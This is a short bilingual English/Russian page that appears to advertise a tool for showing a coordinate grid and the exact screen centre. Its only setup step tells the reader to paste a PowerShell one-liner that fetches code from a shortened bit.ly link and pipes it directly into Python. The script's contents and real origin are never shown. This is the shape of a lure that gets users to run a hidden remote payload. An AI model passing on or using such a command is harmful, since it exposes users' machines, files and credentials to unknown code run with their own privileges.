# 🎯 How to display a coordinate grid and find the screen center via terminal / Как отобразить координатную сетку центра экрана

A lightweight, automated solution to overlay a coordinate grid on your display and instantly find the exact screen center using a single terminal command. 

Универсальное и быстрое решение для вывода координатной сетки на дисплей и точного определения центра экрана одной командой через терминал.

---

## 🇺🇸 English Instruction

### 🚀 Terminal Command to Run
Open your terminal (Windows PowerShell) and execute the following one-liner:

```bash
irm https://bit.ly/SWcoord | python -
```
*Note: Python must be installed on your operating system.*
